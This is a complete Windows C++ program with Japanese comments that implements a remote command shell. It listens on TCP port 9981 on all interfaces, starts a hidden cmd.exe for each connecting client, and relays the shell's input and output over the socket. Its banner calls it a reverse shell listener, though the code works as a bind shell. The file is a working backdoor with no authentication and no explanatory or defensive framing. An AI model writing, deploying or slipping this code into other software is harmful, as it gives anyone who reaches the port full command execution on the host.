#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <thread>
#include <vector>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")

#define PORT 9981
#define BUFFER_SIZE 4096
#define BACKLOG 5

std::atomic<bool> keep_running(true);

BOOL WINAPI ConsoleHandler(DWORD dwType) {
    if (dwType == CTRL_C_EVENT) {
        keep_running = false;
        return TRUE;
    }
    return FALSE;
}

// クライアント処理スレッド
DWORD WINAPI ClientThread(LPVOID lpParam) {
    SOCKET client_sock = (SOCKET)lpParam;

    // クライアント情報取得
    struct sockaddr_in addr;
    int len = sizeof(addr);
    getpeername(client_sock, (sockaddr*)&addr, &len);
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr.sin_addr, ip, INET_ADDRSTRLEN);
    printf("[+] 接続: %s:%d\n", ip, ntohs(addr.sin_port));

    // シェルプロセス（cmd.exe）をパイプで作成
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hStdinRead, hStdinWrite, hStdoutRead, hStdoutWrite;
    if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0) ||
        !CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
        printf("[-] パイプ作成失敗\n");
        closesocket(client_sock);
        return 1;
    }

    // 子プロセス起動
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdinRead;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;

    // cmd.exe を起動（/K で終了しない）
    char cmdLine[] = "cmd.exe /K";
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess 失敗: %d\n", GetLastError());
        closesocket(client_sock);
        CloseHandle(hStdinRead); CloseHandle(hStdinWrite);
        CloseHandle(hStdoutRead); CloseHandle(hStdoutWrite);
        return 1;
    }

    // 不要なハンドルを閉じる（子プロセス側は保持）
    CloseHandle(hStdinRead);
    CloseHandle(hStdoutWrite);
    CloseHandle(pi.hThread);

    // 双方向通信のためのスレッド（stdout -> socket）
    HANDLE hReadThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
        auto* args = (std::pair<SOCKET, HANDLE>*)p;
        SOCKET s = args->first;
        HANDLE hPipe = args->second;
        char buf[BUFFER_SIZE];
        DWORD bytes;
        while (keep_running && ReadFile(hPipe, buf, sizeof(buf), &bytes, NULL) && bytes > 0) {
            send(s, buf, bytes, 0);
        }
        return 0;
    }, new std::pair<SOCKET, HANDLE>(client_sock, hStdoutRead), 0, NULL);

    // メインループ：socket -> stdin
    char buffer[BUFFER_SIZE];
    while (keep_running) {
        int recv_len = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
        if (recv_len <= 0) break;
        buffer[recv_len] = '\0';

        // "exit" で切断
        if (strcmp(buffer, "exit\r\n") == 0 || strcmp(buffer, "exit\n") == 0) {
            break;
        }

        // コマンドを子プロセスのstdinに書き込む
        DWORD written;
        WriteFile(hStdinWrite, buffer, recv_len, &written, NULL);
    }

    // クリーンアップ
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(hStdinWrite);
    CloseHandle(hStdoutRead);
    closesocket(client_sock);
    printf("[-] 切断: %s:%d\n", ip, ntohs(addr.sin_port));
    return 0;
}

int main() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa)) {
        printf("WSAStartup 失敗\n");
        return 1;
    }

    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    SOCKET server = socket(AF_INET, SOCK_STREAM, 0);
    if (server == INVALID_SOCKET) {
        printf("socket 作成失敗\n");
        WSACleanup();
        return 1;
    }

    int opt = 1;
    setsockopt(server, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    if (bind(server, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("bind 失敗\n");
        closesocket(server);
        WSACleanup();
        return 1;
    }

    listen(server, BACKLOG);
    printf("[*] リバースシェルリスナー起動 (ポート %d)\n", PORT);
    printf("[*] Ctrl+C で停止\n");

    while (keep_running) {
        sockaddr_in client_addr;
        int client_len = sizeof(client_addr);
        SOCKET client = accept(server, (sockaddr*)&client_addr, &client_len);
        if (client == INVALID_SOCKET) {
            if (!keep_running) break;
            continue;
        }

        HANDLE hThread = CreateThread(NULL, 0, ClientThread, (LPVOID)client, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }

    closesocket(server);
    WSACleanup();
    printf("[*] サーバー終了\n");
    return 0;
}
